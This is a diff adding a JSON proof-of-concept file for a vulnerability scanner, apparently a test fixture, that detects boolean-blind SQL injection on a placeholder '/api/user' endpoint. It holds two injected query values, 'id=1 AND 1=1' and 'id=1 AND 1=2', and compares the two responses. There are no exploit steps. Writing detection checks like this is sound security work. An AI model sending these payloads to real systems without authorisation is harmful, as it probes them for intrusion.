@@ -1,0 +1,62 @@
+{
+  "Name": "Boolean Blind Injection POC",
+  "Level": "2",
+  "Tags": ["sql-injection", "boolean-blind"],
+  "Description": "布尔盲注测试POC（使用diff对比）",
+  "Product": "Test Product",
+  "Author": "Potato",
+  "HasExp": false,
+  "ScanSteps": [
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/api/user?id=1 AND 1=1",
+        "header": {
+          "User-Agent": "Test"
+        }
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200"
+          }
+        ]
+      }
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/api/user?id=1 AND 1=2",
+        "header": {
+          "User-Agent": "Test"
+        }
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200"
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "diff",
+            "value": "step_0",
+            "bz": "响应内容应与上一步不同"
+          }
+        ]
+      }
+    }
+  ],
+  "ExploitSteps": []
+}
+
